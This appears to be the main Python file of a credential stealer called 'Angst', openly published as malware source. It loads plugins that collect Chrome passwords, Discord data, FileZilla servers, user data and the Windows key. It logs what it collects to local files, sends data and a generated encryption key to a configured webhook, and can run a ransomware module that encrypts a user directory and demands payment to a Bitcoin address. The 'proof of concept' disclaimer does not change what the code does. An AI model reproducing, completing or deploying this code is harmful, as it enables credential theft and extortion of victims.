"""
Author: github.com/backslash
Description: Pure Python Implementation of a Stealer.
Angst Steals:
    - Windows Key
    - Chrome passwords
    - Filezilla Servers
    - Userdata
    - Discord
    - A ransomware module
TOS: This is not meant to be used to harm others,
this was designed as a poc + I was bored and needed to
waste 4-6 hours of my time.


"""
import os
import base64
from plugins.filezilla import FileZilla
from plugins.discord import Discord
from plugins.send import Send
from plugins.user import User
from plugins.chrome import Chrome
from plugins.ransomware import Ransomware

CONFIG = {
    "webhook" : "",
    "chrome" : True,
    "filezilla":False,
    "userdata":True,
    "discord":True,
    "ransomware" : {
        "enabled" : False,
        "target_dir" : "C:\\Users\\testuser", #remove the testuser at the end
        "extenstion" : ".angst",
        "btcAddy" : "",
        "email" : "demo.tmpacc12@gmail.com"
    }
}

class AngstStealer():
    """
    The main class for angst stealer, it loads all of the plugins
    and then proceeds to run the ransomware at the end if its enabled.
    The overall malware logic could and can be improved. Contributers
    are appreciated.
    """
    def __init__(self):
        self.filezilla = FileZilla()
        self.user = User()
        self.chrome = Chrome()
        self.discord = Discord()
        self.ransomware_key = os.urandom(32)
        self.log()
        self.send = Send(CONFIG["webhook"],
                         self.user.userdata,
                         base64.b64encode(self.ransomware_key),
                         CONFIG["ransomware"]["enabled"])
        self.rangst()

    def log(self):
        """
        The code which saves all the logs, this coulde be for sure be improved
        however since I've gotten lazy I will leave it like this since it works.
        """
        app_data = os.getenv("LOCALAPPDATA")
        temp = os.path.join(app_data, "Angst")
        os.mkdir(temp)
        if self.filezilla.saved != "" and CONFIG["filezilla"] == True:
            with open(temp + "\\filezilla.txt", "w") as filezilla_file:
                filezilla_file.write(self.filezilla.saved)
                filezilla_file.flush()
                filezilla_file.close()

        if self.user.userdata != "" and CONFIG["userdata"] == True:
            with open(temp + "\\user.txt", "w") as user_file:
                user_file.write(self.user.userdata)
                user_file.flush()
                user_file.close()

        if self.chrome.stored != "" and CONFIG["chrome"] == True:
            with open(temp + "\\chrome.txt", "w") as chrome_file:
                chrome_file.write(self.chrome.stored)
                chrome_file.flush()
                chrome_file.close()

        if self.discord.saved != "" and CONFIG["discord"] == True:
            with open(temp + "\\discord.txt", "w") as discord_file:
                discord_file.write(self.discord.saved)
                discord_file.flush()
                discord_file.close()

    def rangst(self):
        """
        The ransomware portion of angst.
        """
        if CONFIG["ransomware"]["enabled"]:
            Ransomware(self.ransomware_key,
                       CONFIG["ransomware"]["target_dir"],
                       CONFIG["ransomware"]["extenstion"],
                       CONFIG["ransomware"]["btcAddy"],
                       CONFIG["ransomware"]["email"])

if __name__ == "__main__":
    AngstStealer()
